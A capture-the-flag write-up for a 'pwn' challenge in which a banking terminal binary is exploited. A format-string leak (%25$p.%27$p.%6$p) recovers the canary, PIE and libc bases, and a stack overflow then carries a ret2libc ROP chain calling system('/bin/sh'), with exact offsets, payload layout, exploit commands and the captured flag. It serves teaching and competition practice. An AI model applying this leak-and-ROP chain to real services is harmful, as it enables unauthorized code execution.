# Canary Wharf

## Metadata

| Field | Value |
| --- | --- |
| Category | `pwn` |
| Difficulty | Medium |
| Points | 100 |
| Solves | 80 |
| First Blood | Urck |

## Challenge Description

```text
The Fluid Banking Terminal manages accounts from the comfort of your shell.
Every mitigation is switched on, which the devs find very reassuring.

The flag is /flag.txt.
```

Target used during validation:

```text
0c3c11f55440c66d.chal.ctf.ae:443
```

The service is TLS-wrapped, so the remote connection uses pwntools with
`ssl=True` and SNI set to the hostname.

## Artifacts

The provided archive contained:

```text
public.zip
bank
bank.c
libc.so.6
ld-linux-x86-64.so.2
```

Artifacts produced during the solve:

```text
.venv/                  # local pwntools environment
exploit.py              # pwntools exploit
assets/local/01_leaks.json
assets/local/02_command_output.txt
assets/remote/01_leaks.json
assets/remote/02_command_output.txt
```

## Recon

I started the same way as a normal pwn challenge: identify the binary, confirm
its mitigations, then read the small C source before assuming the bug.

```bash
file bank libc.so.6 ld-linux-x86-64.so.2
```

Relevant output:

```text
bank: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
libc.so.6: ELF 64-bit LSB shared object, x86-64, stripped
ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64
```

I installed pwntools in a local venv and used its `checksec` helper:

```bash
python3 -m venv .venv
.venv/bin/pip install pwntools
.venv/bin/pwn checksec bank
```

Output:

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

The mitigation profile mattered for planning:

```text
Full RELRO -> no GOT overwrite
NX         -> no stack shellcode
Canary     -> overflow must preserve the stack canary
PIE        -> code pointers need a binary base leak
ASLR libc  -> ret2libc needs a libc leak
```

The source is a small menu application:

```text
[1] Check Balance
[2] Transfer Funds
[3] Exit
```

The first suspicious function was `check_balance()`:

```c
char note[128];
...
read(0, note, 127);
...
printf("Account Holder: ");
printf(note);
```

That is an uncontrolled format string. I did not know the exact useful stack
indices yet, but `printf(note)` made `%p` and positional parameters worth
testing.

The second suspicious function was `transfer_funds()`:

```c
char amount[64];
...
read(0, amount, 256);
```

That is a stack overflow, but it is not directly exploitable because stack
canaries are enabled. The natural plan became:

```text
format string leak -> canary + PIE base + libc base
stack overflow     -> canary-preserving ret2libc
```

## Vulnerability

There are two bugs that have to be chained.

The first bug is the format string in `check_balance()`:

```c
printf(note);
```

The Linux `printf(3)` manual documents positional argument syntax such as
`%m$`, and that is exactly what made this bug convenient: instead of dumping the
stack one value at a time, I could ask for specific stack slots with `%25$p`,
`%27$p`, and `%6$p`.

I found the useful indices by probing positional `%p` values and looking for
three kinds of data:

1. A canary-like value: 8 bytes, low byte `00`.
2. A PIE code pointer: pointer close to `bank` code, page-aligning after
   subtracting a return-site offset.
3. A libc pointer: pointer that gives a page-aligned base when subtracting a
   known libc symbol from the provided `libc.so.6`.

The final leak string was:

```text
%25$p.%27$p.%6$p
```

On the validated remote run it produced:

```json
{
  "canary": "0xfe411a5cf7cda000",
  "pie_return_leak": "0x565543b205e7",
  "stdout_leak": "0x7f62473c6780"
}
```

The second bug is the stack overflow in `transfer_funds()`:

```c
char amount[64];
read(0, amount, 256);
```

The disassembly explains the exact offset:

```text
amount buffer -> rbp-0x50
canary        -> rbp-0x8
distance      -> 0x50 - 0x8 = 0x48 = 72 bytes
```

So the payload must be:

```text
72 bytes padding
original canary
saved rbp filler
ROP chain
```

GCC's stack protector documentation describes this guard behavior: functions
with vulnerable local buffers get a guard value that is checked before return.
That is why leaking and replaying the canary is required.

## Exploitation

The exploit chain is:

1. Connect to the local process or remote TLS service.
2. Select menu option `1`.
3. Send `%25$p.%27$p.%6$p`.
4. Parse the stack canary, a return address inside `main`, and a libc pointer.
5. Compute PIE base and libc base.
6. Select menu option `2`.
7. Overflow `amount[64]` with a canary-preserving ret2libc payload.
8. Run `cat /flag.txt` through the spawned shell.

The return address leak points to the instruction after `check_balance()` in
`main`:

```text
main + 0x81 = 0x15e7
```

Therefore:

```text
pie_base = leaked_main_return - 0x15e7
```

The libc leak is `_IO_2_1_stdout_` from the provided libc:

```text
_IO_2_1_stdout_ = libc + 0x21b780
libc_base       = stdout_leak - 0x21b780
```

The ret2libc offsets used by the exploit are:

```text
system              = libc + 0x50d70
"/bin/sh"           = libc + 0x1d8678
pop rdi; ret        = libc + 0x2a3e5
ret                 = libc + 0x29d04
```

The extra `ret` gadget is used for stack alignment before calling `system`.

The final ROP layout is:

```text
"A" * 72
p64(canary)
"B" * 8
p64(ret)
p64(pop_rdi_ret)
p64(bin_sh)
p64(system)
```

## Exploit Artifact

`exploit.py` is the final pwntools exploit. It uses:

```python
ELF("./bank")
ELF("./libc.so.6")
process([ld.path, "--library-path", ".", elf.path])
remote(host, port, ssl=True, sni=host)
flat(...)
```

I intentionally left the libc gadget/string offsets as constants after
validating them. Runtime `ROP(libc)` gadget scanning was slower than necessary
in this environment, while fixed offsets are appropriate because the challenge
ships the exact remote `libc.so.6`.

Local validation:

```bash
.venv/bin/python exploit.py \
  --local \
  --cmd 'echo LOCAL_OK; exit' \
  --evidence-dir assets/local
```

Output:

```text
[*] canary    = 0xd15950dc00998e00
[*] pie_base  = 0x7edc6abab000
[*] libc_base = 0x7edc6a800000
LOCAL_OK
```

Remote validation:

```bash
.venv/bin/python exploit.py --evidence-dir assets/remote
```

Output:

```text
[*] canary    = 0xfe411a5cf7cda000
[*] pie_base  = 0x565543b1f000
[*] libc_base = 0x7f62471ab000
flag{33c0a95995c973a2}
```

The remote leak evidence is saved in `assets/remote/01_leaks.json`:

```json
{
  "canary": "0xfe411a5cf7cda000",
  "libc_base": "0x7f62471ab000",
  "pie_base": "0x565543b1f000",
  "pie_return_leak": "0x565543b205e7",
  "stdout_leak": "0x7f62473c6780"
}
```

The final remote command output is saved in
`assets/remote/02_command_output.txt`:

```text
flag{33c0a95995c973a2}
```

## Technical Details

The format string leak works because `printf(note)` treats attacker-controlled
memo text as a format string. Since no matching variadic arguments were passed,
`printf` resolves the requested positional values from whatever is already in
the call context. In this binary, the stack layout during the vulnerable call
exposes enough data to defeat every mitigation needed for exploitation:

```text
%25$p -> stack canary
%27$p -> return address after check_balance()
%6$p  -> libc stdout pointer
```

The overflow works because `read(0, amount, 256)` writes up to 256 bytes into a
64-byte stack buffer. The function epilogue checks the canary before returning,
so the payload must restore the leaked canary exactly. Once the canary check
passes, the saved return address is controlled and can return into libc.

The supplied dynamic loader and libc are important for reproducibility. Locally,
the exploit starts the binary like this:

```python
process([ld.path, "--library-path", ".", elf.path])
```

That mirrors the remote libc version and keeps all offsets consistent.

## Validation

Syntax check:

```bash
.venv/bin/python -m py_compile exploit.py
```

Mitigation check:

```bash
.venv/bin/pwn checksec bank
```

Local exploit:

```bash
.venv/bin/python exploit.py \
  --local \
  --cmd 'echo LOCAL_OK; exit' \
  --evidence-dir assets/local
```

Remote exploit:

```bash
.venv/bin/python exploit.py --evidence-dir assets/remote
```

Result:

```text
flag{33c0a95995c973a2}
```

## References

- <https://docs.pwntools.com/en/stable/tubes/sockets.html>
- <https://man7.org/linux/man-pages/man3/printf.3.html>
- <https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html>

## Flag

```text
flag{33c0a95995c973a2}
```
